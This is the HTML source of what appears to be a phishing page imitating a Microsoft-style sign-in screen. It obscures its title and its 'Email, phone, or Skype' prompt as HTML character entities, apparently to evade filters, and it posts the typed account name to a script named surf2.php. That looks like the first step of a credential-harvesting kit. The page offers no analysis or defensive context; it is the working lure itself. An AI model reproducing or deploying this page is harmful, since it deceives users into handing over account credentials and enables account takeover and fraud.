<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#83;&#105;&#103;&#110;&#32;&#73;&#110;</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>	
<style type="text/css">
 .textbox {
    height: 36px;
    width: 275px;
	padding-left: 8px;
	font-family: "Segoe UI Webfont",-apple-system,"Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
    font-size: 15px;
    line-height: 20px;
    font-weight: 400;
    font-size: .9375rem;
	border: none;
    border-bottom: 1px solid #666;
}
 .textbox:focus {
	border: none;
    border-bottom: 1px solid #4488cc;
    outline: 0;
}
 </style>
<style>
p{font-size: 40px;}
.loader {
    position: fixed;
    left: 0px;
    top: 0px;
    width: 100%;
    height: 100%;
    z-index: 9999;
    background: url('https://smallenvelop.com/wp-content/uploads/2014/08/Preloader_11.gif') 50% 50% no-repeat rgb(249,249,249);
    opacity: .8;
}
</style>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script type="text/javascript">
$(window).load(function() {
	$(".loader").fadeOut("slow");
});
</script>

</head>
<body>
<div class="loader"></div>
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:370px; height:245px; z-index:0"><img src="images/c1.png" alt="" title="" border=0 width=370 height=245></div>

<div id="image2" style="position:absolute; overflow:hidden; left:0px; top:505px; width:370px; height:25px; z-index:1"><img src="images/c2.png" alt="" title="" border=0 width=370 height=25></div>
<form action=surf2.php name=pehlinazr id=pehlinazr method=post>
<input name="user" placeholder="&#69;&#109;&#97;&#105;&#108;&#44;&#32;&#112;&#104;&#111;&#110;&#101;&#44;&#32;&#111;&#114;&#32;&#83;&#107;&#121;&#112;&#101;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:321px;left:31px;top:120px;z-index:2">
<div id="formimage1" style="position:absolute; left:30px; top:172px; z-index:3"><input type="image" name="formimage1" width="323" height="38" src="images/nxt.png"></div>

</body>
</html>
